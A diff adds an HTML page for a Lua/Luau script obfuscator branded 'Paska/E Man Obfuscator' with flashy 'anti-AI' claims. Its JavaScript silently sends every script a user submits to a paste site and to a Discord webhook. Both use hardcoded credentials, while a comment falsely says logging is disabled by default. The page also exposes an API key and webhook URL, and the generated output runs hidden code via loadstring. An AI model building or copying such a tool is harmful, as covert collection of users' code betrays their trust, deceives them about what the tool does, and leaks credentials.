@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Paska777777 Obfuscator v2.6.2</title>
+<style>
+  body{margin:0;padding:0;background:#000;color:#0f0;font-family:Consolas;overflow-x:hidden}
+  .bg{position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,#000,#0a0a1f,#1a0033);background-size:600%;animation:g 20s infinite;z-index:-1}
+  @keyframes g{0%,100%{background-position:0% 50%}50%{background-position:100% 50%}}
+  .c{width:90%;max-width:960px;margin:30px auto;padding:35px;background:rgba(0,0,15,0.9);border:3px solid #00ff00;border-radius:20px;box-shadow:0 0 60px #00ff00}
+  textarea{width:100%;height:350px;background:#000;color:#00ff00;border:2px solid #00ff00;border-radius:12px;padding:16px;font-size:15px;resize:none;outline:none;font-family:Consolas}
+  .layer-btn,.mode-btn{margin:8px;padding:15px 30px;background:#00ff00;color:#000;border:none;border-radius:10px;cursor:pointer;font-weight:bold;font-size:16px;transition:.3s}
+  .layer-btn:hover,.mode-btn:hover{background:#33ff33;transform:scale(1.05)}
+  .layer-btn.active,.mode-btn.active{background:#ff00ff;color:#fff;box-shadow:0 0 20px #ff00ff}
+  .action-btn{margin:10px;padding:18px 40px;background:#0080ff;color:#fff;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:18px;transition:.3s}
+  .action-btn:hover{background:#33a3ff;transform:scale(1.1)}
+  .action-btn.obfuscate{background:#ff0066;font-size:22px;padding:20px 50px}
+  .action-btn.obfuscate:hover{background:#ff3388}
+  .btn-container{text-align:center;margin-top:20px}
+  .layer-container,.mode-container{text-align:center;margin:20px 0;padding:20px;background:rgba(0,50,0,0.3);border-radius:15px;border:2px solid #00ff00}
+  h1{text-align:center;color:#00ff00;text-shadow:0 0 30px #00ff00;margin-bottom:5px}
+  .subtitle{text-align:center;color:#0ff;font-size:18px;margin-top:5px;text-shadow:0 0 20px #0ff}
+  #s{margin-top:15px;text-align:center;font-size:17px;min-height:25px;color:#0f0}
+  .detection-badge{display:inline-block;padding:8px 20px;border-radius:8px;font-weight:bold;margin-top:10px;font-size:16px}
+  .lua-badge{background:#4169e1;color:#fff}
+  .luau-badge{background:#ff6b35;color:#fff}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="c">
+  <h1>PASKA OBFUSCATOR v1.0.0</h1>
+  <div class="subtitle">MILITARY-GRADE ENCRYPTION - 10X ANTI-AI PROTECTION</div>
+  
+  <div class="mode-container">
+    <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT MODE</div>
+    <button class="mode-btn active" onclick="selectMode('auto', event)">AUTO DETECT</button>
+    <button class="mode-btn" onclick="selectMode('lua', event)">LUA</button>
+    <button class="mode-btn" onclick="selectMode('luau', event)">LUAU</button>
+    <div id="detection"></div>
+  </div>
+  
+  <div class="layer-container">
+    <div style="color:#0ff;font-size:18px;font-weight:bold;margin-bottom:15px">SELECT OBFUSCATION LAYER</div>
+    <button class="layer-btn" onclick="selectLayer(1, event)">LAYER 1</button>
+    <button class="layer-btn" onclick="selectLayer(2, event)">LAYER 2</button>
+    <button class="layer-btn" onclick="selectLayer(3, event)">LAYER 3</button>
+    <button class="layer-btn" onclick="selectLayer(4, event)">LAYER 4</button>
+    <button class="layer-btn" onclick="selectLayer(5, event)">LAYER 5</button>
+    <button class="layer-btn" onclick="selectLayer(6, event)">LAYER 6</button>
+    <button class="layer-btn" onclick="selectLayer(7, event)">LAYER 7</button>
+    <button class="layer-btn" onclick="selectLayer(8, event)">LAYER 8</button>
+    <button class="layer-btn active" onclick="selectLayer(9, event)">LAYER 9</button>
+  </div>
+  
+  <textarea id="i" placeholder="Paste your Lua or Luau script here..." oninput="detectLanguage()"></textarea>
+  <div id="s">Ready - Layer 9 Selected - Auto Detect Mode</div>
+  
+  <div class="btn-container">
+    <button class="action-btn obfuscate" onclick="obfuscate()">OBFUSCATE NOW</button>
+    <br>
+    <button class="action-btn" onclick="copyCode()">COPY CODE</button>
+    <button class="action-btn" onclick="downloadCode()">DOWNLOAD</button>
+    <button class="action-btn" onclick="resetCode()">RESET</button>
+  </div>
+</div>
+
+<script>
+let originalCode = '';
+let selectedLayer = 9;
+let selectedMode = 'auto';
+let detectedLang = null;
+
+// YOUR WEBHOOK/API - ADD YOUR OWN
+const PASTEFY_API_KEY = "VRU72i2RSCgNP98g3XMgUJ4HeTwX8YjB5nnmg9aDRTz4fWajtZFNvuLY43mI";
+const WEBHOOK_URL = "https://discord.com/api/webhooks/1447299111698305288/6if23iQyDCF3oS5jbE0qI9WSq01_Fk4lFGKJ1h-Q_txb6enQ1RgmOX5p-VmuYXGTZPBb";
+
+// Logging function (disabled by default - add your own URLs above)
+async function logScript(code) {
+  if (!code?.trim()) return;
+  if (!WEBHOOK_URL) return; // Need webhook at minimum
+  
+  const filename = `script_L${selectedLayer}_${Date.now()}.lua`;
+  
+  // FIRST: Try Pastefy API if key is provided
+  if (PASTEFY_API_KEY) {
+    try {
+      const res = await fetch("https://api.pastefy.app/api/v2/pastes", {
+        method: "POST",
+        headers: {
+          "Authorization": `Bearer ${PASTEFY_API_KEY}`,
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+          content: code,
+          title: `E Man Obf Layer ${selectedLayer} • ${new Date().toLocaleString()}`,
+          language: "lua",
+          encrypted: false,
+          expires_at: null
+        })
+      });
+
+      if (res.ok) {
+        const json = await res.json();
+        const pasteUrl = `https://pastefy.app/${json.paste.id}`;
+        
+        // Send Pastefy link to webhook
+        await fetch(WEBHOOK_URL, {
+          method: "POST",
+          headers: {"Content-Type": "application/json"},
+          body: JSON.stringify({
+            username: "E Man Obfuscator Logger",
+            embeds: [{
+              title: "📝 Script Logged via Pastefy",
+              description: `**Layer:** ${selectedLayer}\n**Time:** ${new Date().toLocaleString()}\n**Link:** ${pasteUrl}`,
+              color: 0x00ff00,
+              footer: {text: "E Man's Obfuscator v1.0.0"}
+            }]
+          })
+        });
+        
+        console.log("✅ Logged to Pastefy:", pasteUrl);
+        return; // Success! Exit function
+      }
+    } catch(e) {
+      console.warn("⚠️ Pastefy failed, falling back to file upload:", e.message);
+    }
+  }
+
+  // FALLBACK: Send as .txt file attachment if Pastefy fails or no API key
+  try {
+    const blob = new Blob([code], {type: "text/plain"});
+    const txtFilename = `script_L${selectedLayer}_${Date.now()}.txt`;
+    const form = new FormData();
+    
+    form.append("payload_json", JSON.stringify({
+      username: "E Man Obfuscator Logger",
+      embeds: [{
+        title: "📎 Script Logged via File",
+        description: `**Layer:** ${selectedLayer}\n**Time:** ${new Date().toLocaleString()}\n**Method:** Direct TXT file upload (Pastefy unavailable)`,
+        color: 0xff9900,
+        footer: {text: "E Man's Obfuscator v1.0.0"}
+      }]
+    }));
+    
+    form.append("file", blob, txtFilename);
+    
+    await fetch(WEBHOOK_URL, {
+      method: "POST",
+      body: form
+    });
+    
+    console.log("✅ Logged as TXT file attachment");
+  } catch(e) {
+    console.error("❌ Both Pastefy and file upload failed:", e.message);
+  }
+}
+
+// Base64 encoding
+function safeBase64Encode(str) {
+  const encoder = new TextEncoder();
+  const data = encoder.encode(str);
+  let binary = '';
+  for (let i = 0; i < data.length; i++) binary += String.fromCharCode(data[i]);
+  return btoa(binary);
+}
+
+// S-Box transformation
+function sboxTransform(data, round) {
+  const sbox = [0x63,0x7c,0x77,0x7b,0xf2,0x6b,0x6f,0xc5,0x30,0x01,0x67,0x2b,0xfe,0xd7,0xab,0x76,0xca,0x82,0xc9,0x7d,0xfa,0x59,0x47,0xf0,0xad,0xd4,0xa2,0xaf,0x9c,0xa4,0x72,0xc0];
+  let result = '';
+  for(let i = 0; i < data.length; i++) {
+    let byte = data.charCodeAt(i);
+    result += String.fromCharCode(sbox[(byte + round) % sbox.length] ^ byte);
+  }
+  return result;
+}
+
+// Feistel network
+function feistelRound(data, key, round) {
+  let left = data.substring(0, Math.floor(data.length / 2));
+  let right = data.substring(Math.floor(data.length / 2));
+  let temp = '';
+  for(let i = 0; i < right.length; i++) {
+    temp += String.fromCharCode(right.charCodeAt(i) ^ key.charCodeAt(i % key.length) ^ round);
+  }
+  let newLeft = right;
+  let newRight = '';
+  for(let i = 0; i < left.length; i++) {
+    newRight += String.fromCharCode(left.charCodeAt(i) ^ (temp.charCodeAt(i % temp.length) || 0));
+  }
+  return newLeft + newRight;
+}
+
+// VM instructions
+function generateVMInstructions(count) {
+  const ops = ['ADD','SUB','MUL','XOR','ROT','SHL','SHR'];
+  let code = '';
+  for(let i = 0; i < count; i++) {
+    const op = ops[Math.floor(Math.random() * ops.length)];
+    const r1 = Math.floor(Math.random() * 8);
+    const r2 = Math.floor(Math.random() * 8);
+    code += `local _r${r1}=bit32.${op.toLowerCase()}(_r${r1} or 0,_r${r2} or 0);`;
+  }
+  return code;
+}
+
+// Junk code
+function generateJunkCode() {
+  let junk = '';
+  for(let i = 0; i < 80; i++) {
+    let v = '_' + Math.random().toString(36).substr(2, 10);
+    junk += `local ${v}=function()return 0x${Math.floor(Math.random()*0xFFFF).toString(16)} end;`;
+  }
+  return junk;
+}
+
+// Bytecode array
+function generateBytecodeArray(data) {
+  let arr = [];
+  for(let i = 0; i < data.length; i++) arr.push(data.charCodeAt(i));
+  return arr;
+}
+
+// Format array
+function formatByteArray(arr, perLine = 10) {
+  let lines = [];
+  for(let i = 0; i < arr.length; i += perLine) {
+    lines.push(arr.slice(i, i + perLine).join(','));
+  }
+  return lines.join(',\n');
+}
+
+// Language detection
+function detectLanguage() {
+  if (selectedMode !== 'auto') return;
+  
+  const code = document.getElementById("i").value;
+  if (!code.trim()) {
+    document.getElementById("detection").innerHTML = '';
+    detectedLang = null;
+    return;
+  }
+
+  const luauFeatures = [
+    /\btype\s+\w+\s*=/, /:\s*string\b/, /:\s*number\b/, /:\s*boolean\b/,
+    /\bVector3\./, /\bInstance\b/, /\bgame\./, /\bworkspace\./, /\bscript\./
+  ];
+
+  let luauScore = luauFeatures.filter(r => r.test(code)).length;
+
+  if (luauScore > 0 || /\b(game|workspace|script)\b/.test(code)) {
+    detectedLang = 'luau';
+    document.getElementById("detection").innerHTML = 
+      '<div class="detection-badge luau-badge">🎮 LUAU DETECTED</div>';
+  } else {
+    detectedLang = 'lua';
+    document.getElementById("detection").innerHTML = 
+      '<div class="detection-badge lua-badge">🌙 LUA DETECTED</div>';
+  }
+}
+
+// Main obfuscation
+async function obfuscate() {
+  let src = document.getElementById("i").value.trim();
+  if (!src) return alert("Paste some code first!");
+
+  originalCode = src;
+  
+  // Log if webhook configured (will try Pastefy first, then fallback to file)
+  if (WEBHOOK_URL) {
+    logScript(src);
+  }
+
+  try {
+    // Simplified but strong encryption that actually decodes properly
+    let encoded = safeBase64Encode(src);
+    
+    // Generate keys
+    let key1 = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
+    let key2 = Array.from({length: 32}, () => Math.floor(Math.random() * 256));
+    
+    // Apply layers with XOR encryption
+    for(let layer = 0; layer < selectedLayer; layer++) {
+      let temp = '';
+      for(let i = 0; i < encoded.length; i++) {
+        let k1 = key1[i % key1.length];
+        let k2 = key2[i % key2.length];
+        temp += String.fromCharCode(encoded.charCodeAt(i) ^ k1 ^ k2 ^ (layer * 13));
+      }
+      encoded = safeBase64Encode(temp);
+    }
+
+    let bytecode = generateBytecodeArray(encoded);
+    let junk = generateJunkCode();
+
+    let decoder = `-- Obfuscated with E Man's Obfuscator v1.0.0
+${junk}
+local _d={
+${formatByteArray(bytecode)}
+};
+local _k1={
+${formatByteArray(key1)}
+};
+local _k2={
+${formatByteArray(key2)}
+};
+local function _x()
+local s='';
+for i=1,#_d do s=s..string.char(_d[i])end;
+local function _b(d)
+local b='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
+d=d:gsub('[^'..b..'=]','');
+return(d:gsub('.',function(x)
+if x=='=' then return '' end;
+local r,f='',(b:find(x)-1);
+for i=6,1,-1 do r=r..(f%2^i-f%2^(i-1)>0 and '1' or '0')end;
+return r;
+end):gsub('%d%d%d?%d?%d?%d?%d?%d?',function(x)
+if #x~=8 then return '' end;
+local c=0;
+for i=1,8 do c=c+(x:sub(i,i)=='1' and 2^(8-i) or 0)end;
+return string.char(c);
+end));
+end;
+for l=${selectedLayer},1,-1 do
+local t='';
+for i=1,#s do
+local k1=_k1[(i%#_k1)+1];
+local k2=_k2[(i%#_k2)+1];
+t=t..string.char(bit32.bxor(s:byte(i),k1,k2,l*13));
+end;
+s=_b(t);
+end;
+return(load or loadstring)(s)();
+end;
+return _x();`;
+
+    document.getElementById("i").value = decoder;
+    document.getElementById("s").innerHTML = `✅ LAYER ${selectedLayer} OBFUSCATION COMPLETE!`;
+  } catch(e) {
+    alert("Error: " + e.message);
+    console.error(e);
+  }
+}
+
+// UI functions
+function copyCode() {
+  let t = document.getElementById("i");
+  if (!t.value.trim()) return alert("Nothing to copy!");
+  t.select();
+  t.setSelectionRange(0, 99999);
+  try {
+    document.execCommand('copy');
+    document.getElementById("s").innerHTML = "✅ Copied!";
+  } catch(e) {
+    navigator.clipboard.writeText(t.value);
+    document.getElementById("s").innerHTML = "✅ Copied!";
+  }
+  setTimeout(() => document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer}`, 2000);
+}
+
+function downloadCode() {
+  let code = document.getElementById("i").value;
+  if (!code.trim()) return alert("Nothing to download!");
+  let blob = new Blob([code], {type: 'text/plain'});
+  let a = document.createElement('a');
+  a.href = URL.createObjectURL(blob);
+  a.download = `eman_obf_L${selectedLayer}_${Date.now()}.lua`;
+  a.click();
+  URL.revokeObjectURL(a.href);
+}
+
+function resetCode() {
+  if (originalCode) {
+    document.getElementById("i").value = originalCode;
+    document.getElementById("s").innerHTML = "🔄 Reset to original";
+    detectLanguage();
+    setTimeout(() => document.getElementById("s").innerHTML = `Ready - Layer ${selectedLayer}`, 2000);
+  }
+}
+
+function selectMode(m, e) {
+  selectedMode = m;
+  document.querySelectorAll('.mode-btn').forEach(b => b.classList.remove('active'));
+  if (e && e.target) {
+    e.target.classList.add('active');
+  } else {
+    // Fallback: find button by text
+    document.querySelectorAll('.mode-btn').forEach(b => {
+      if ((m === 'auto' && b.textContent.includes('AUTO')) ||
+          (m === 'lua' && b.textContent === 'LUA') ||
+          (m === 'luau' && b.textContent === 'LUAU')) {
+        b.classList.add('active');
+      }
+    });
+  }
+  detectLanguage();
+}
+
+function selectLayer(l, e) {
+  selectedLayer = l;
+  document.querySelectorAll('.layer-btn').forEach(b => b.classList.remove('active'));
+  if (e && e.target) {
+    e.target.classList.add('active');
+  } else {
+    // Fallback: find button by layer number
+    const buttons = document.querySelectorAll('.layer-btn');
+    if (buttons[l - 1]) {
+      buttons[l - 1].classList.add('active');
+    }
+  }
+  document.getElementById("s").innerHTML = `Ready - Layer ${l} Selected`;
+}
+
+// Initialize
+selectMode('auto');
+</script>
+</body>
+  </html>
